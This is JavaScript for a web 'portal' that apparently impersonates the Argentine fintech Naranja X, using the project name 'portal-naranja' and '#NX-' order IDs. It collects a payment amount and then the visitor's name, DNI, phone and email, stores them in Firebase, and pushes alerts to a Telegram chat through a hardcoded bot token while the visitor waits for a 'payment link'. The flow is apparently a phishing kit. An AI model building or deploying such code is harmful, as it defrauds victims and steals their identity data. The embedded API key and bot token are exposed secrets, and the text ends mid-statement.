import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getDatabase, ref, push, onValue, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyDHcfixcpUU4O-RYLmfNzTUDZFB13jEt5s",
  authDomain: "portal-naranja-763f4.firebaseapp.com",
  databaseURL: "https://portal-naranja-763f4-default-rtdb.firebaseio.com",
  projectId: "portal-naranja-763f4",
  storageBucket: "portal-naranja-763f4.firebasestorage.app",
  messagingSenderId: "908694133500",
  appId: "1:908694133500:web:1808b481eeb45c305c9579"
};

const appFB = initializeApp(firebaseConfig);
const db = getDatabase(appFB);

// =========================================================================
// CONFIGURACIÓN DE TELEGRAM CONFIGURADA CON TUS DATOS
// =========================================================================
const TELEGRAM_BOT_TOKEN = "8906772282:AAHBg0gXgAPJKnYLZvLv4t6EaGrtWKL1Wvo";
const TELEGRAM_CHAT_ID = "8974856495";

class App {
  constructor() {
    this.state = {
      currentView: 'screen-1',
      client: { name: '', dni: '', phone: '', email: '' },
      currentCategory: null,
      currentOrderId: null,
      currentFirebaseKey: null,
      claimAmount: '',
      payAmount: '',
      payType: 'Pago Total',
      selectedBanks: [],
      treasurers: []
    };
    this.init();
  }

  init() {
    this.listenToTreasurers();
    this.updateView();
  }

  formatNumberToAR(numStr) {
    const cleanNum = numStr.toString().replace(/\D/g, '');
    if (!cleanNum) return '';
    return new Intl.NumberFormat('de-DE').format(cleanNum);
  }

  formatCurrencyInput(inputElement) {
    inputElement.value = this.formatNumberToAR(inputElement.value);
  }

  formatTimestamp(dateObj) {
    const d = dateObj || new Date();
    const day = String(d.getDate()).padStart(2, '0');
    const month = String(d.getMonth() + 1).padStart(2, '0');
    const year = d.getFullYear();
    const hours = String(d.getHours()).padStart(2, '0');
    const minutes = String(d.getMinutes()).padStart(2, '0');
    return `${day}/${month}/${year}, ${hours}:${minutes} hs`;
  }

  goToCategorySelection() {
    this.state.currentView = 'screen-categories';
    this.updateView();
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  selectCategory(category) {
    this.state.currentCategory = category;
    if (category === 'app_issues') {
      this.state.currentView = 'flow-app-info';
    } else if (category === 'payments') {
      this.state.currentView = 'flow-pay-amount';
    } else if (category === 'transfers') {
      this.state.currentView = 'flow-transfers';
    }
    this.updateView();
  }

  // --- ENVÍA ALERTA DIRECTA A TELEGRAM DESDE EL NAVEGADOR DEL CLIENTE ---
  async sendTelegramAlert(requestData) {
    try {
      const text = `🚨 *¡NUEVO PEDIDO DE LINK RECIBIDO!*\n\n` +
                   `🆔 *ID Pedido:* \`${requestData.id}\`\n` +
                   `💰 *Monto a Abonar:* *$${requestData.amount}*\n` +
                   `📌 *Modalidad:* ${requestData.paymentType}\n` +
                   `🕒 *Fecha/Hora:* ${requestData.requestTime}\n\n` +
                   `⏳ _El cliente está completando sus datos personales en este momento..._`;

      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'Markdown' })
      });
    } catch (e) {
      console.error("Error enviando notificación a Telegram:", e);
    }
  }

  // --- FLUJO B: ENVÍA AL PANEL Y DISPARA TELEGRAM APENAS INGRESA EL IMPORTE ---
  async submitAmountAndGoToUserData() {
    const rawAmount = document.getElementById('pay-amount').value.trim();
    const paymentType = document.getElementById('pay-type').value;

    if (!rawAmount) {
      alert('Por favor, ingresa un monto válido a abonar.');
      return;
    }

    const formattedAmount = this.formatNumberToAR(rawAmount);
    this.state.payAmount = formattedAmount;
    this.state.payType = paymentType;

    const orderId = '#NX-' + Math.floor(1000 + Math.random() * 9000);
    this.state.currentOrderId = orderId;
    const nowFormatted = this.formatTimestamp(new Date());

    const newRequest = {
      id: orderId,
      name: 'Completando datos...',
      dni: 'Pendiente',
      phone: 'Pendiente',
      email: 'Pendiente',
      category: 'payments',
      amount: formattedAmount,
      paymentType: paymentType,
      selectedBanks: [],
      paymentUrl: '',
      status: 'Pendiente de Link',
      createdAt: Date.now(),
      requestTime: nowFormatted
    };

    try {
      // 1. Guarda en Firebase
      const newRef = await push(ref(db, 'requests'), newRequest);
      this.state.currentFirebaseKey = newRef.key;

      // 2. Dispara la notificación a Telegram inmediatamente
      this.sendTelegramAlert(newRequest);
    } catch (error) {
      console.error("Error al guardar en Firebase:", error);
    }

    this.state.currentView = 'flow-pay-user-data';
    this.updateView();
  }

  async handlePayUserSubmit(e) {
    e.preventDefault();
    this.state.client = {
      name: document.getElementById('pay-client-name').value.trim(),
      dni: document.getElementById('pay-client-dni').value.trim(),
      phone: document.getElementById('pay-client-phone').value.trim(),
      email: document.getElementById('pay-client-email').value.trim()
    };

    // Actualiza datos del cliente en Firebase cuando avanza de pantalla
    if (this.state.currentFirebaseKey) {
      try {
        await update(ref(db, `requests/${this.state.currentFirebaseKey}`), {
          name: this.state.client.name,
          dni: this.state.client.dni,
          phone: this.state.client.phone,
          email: this.state.client.email
        });
      } catch (err) {
        console.error("Error actualizando datos cliente:", err);
      }
    }

    document.getElementById('sum-client-name').innerText = this.state.client.name;
    document.getElementById('sum-client-dni').innerText = this.state.client.dni;
    document.getElementById('sum-pay-type').innerText = this.state.payType;
    document.getElementById('sum-pay-amount').innerText = `$${this.state.payAmount}`;

    this.state.currentView = 'flow-pay-summary';
    this.updateView();
  }

  confirmAndGoToWaiting() {
    document.getElementById('display-order-id').innerText = this.state.currentOrderId;
    document.getElementById('display-order-amount').innerText = `$${this.state.payAmount}`;

    this.state.currentView = 'pay-waiting';
    this.updateView();

    this.listenToOrderStatus(this.state.currentOrderId);
  }

  goBack() {
    const view = this.state.currentView;

    if (view === 'screen-categories') {
      this.state.currentView = 'screen-1';
    } else if (view === 'flow-app-info' || view === 'flow-pay-amount' || view === 'flow-transfers') {
      this.state.currentView = 'screen-categories';
    } else if (view === 'flow-pay-user-data') {
      this.state.currentView = 'flow-pay-amount';
    } else if (view === 'flow-pay-summary') {
      this.state.currentView = 'flow-pay-user-data';
    } else if (view === 'pay-waiting') {
      this.state.currentView = 'flow-pay-summary';
    } else if (view === 'flow-app-treasury') {
      this.state.currentView = 'flow-app-info';
    } else if (view === 'flow-app-operator') {
      this.state.currentView = 'flow-app-treasury';
    } else if (view === 'claim-banks') {
      this.state.currentView = 'flow-transfers';
    } else if (view === 'claim-instructions') {
      this.state.currentView = 'claim-banks';
    } else if (view === 'claim-waiting') {
      this.state.currentView = 'claim-instructions';
    }

    this.updateView();
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  updateView() {
    const views = [
      'screen-1', 'screen-categories', 
      'flow-app-info', 'flow-app-treasury', 'flow-app-operator',
      'flow-pay-amount', 'flow-pay-user-data', 'flow-pay-summary', 'pay-waiting-view', 
      'flow-transfers', 'claim-form-view', 'claim-banks-view', 'claim-instructions-view', 'claim-waiting-view'
    ];

    views.forEach(id => {
      const el = document.getElementById(id);
      if (el) el.classList.add('hidden');
    });

    const navHeader = document.getElementById('nav-header-container');
    const v = this.state.currentView;

    if (v === 'screen-1') {
      if (navHeader) {
        navHeader.classList.add('hidden');
        navHeader.classList.remove('flex');
      }
      document.getElementById('screen-1').classList.remove('hidden');
      return;
    }

    if (navHeader) {
      navHeader.classList.remove('hidden');
      navHeader.classList.add('flex');
    }

    if (v === 'screen-categories') {
      document.getElementById('screen-categories').classList.remove('hidden');
      this.updateProgress(1, 3, 'Selección de Gestión', '33%');

    } else if (v === 'flow-pay-amount') {
      document.getElementById('flow-pay-amount').classList.remove('hidden');
      this.updateProgress(2, 3, 'Paso 1: Monto a Abonar', '50%');
      if (this.state.payAmount) document.getElementById('pay-amount').value = this.state.payAmount;

    } else if (v === 'flow-pay-user-data') {
      document.getElementById('flow-pay-user-data').classList.remove('hidden');
      this.updateProgress(2, 3, 'Paso 2: Datos Personales', '75%');
      if (this.state.client.name) document.getElementById('pay-client-name').value = this.state.client.name;
      if
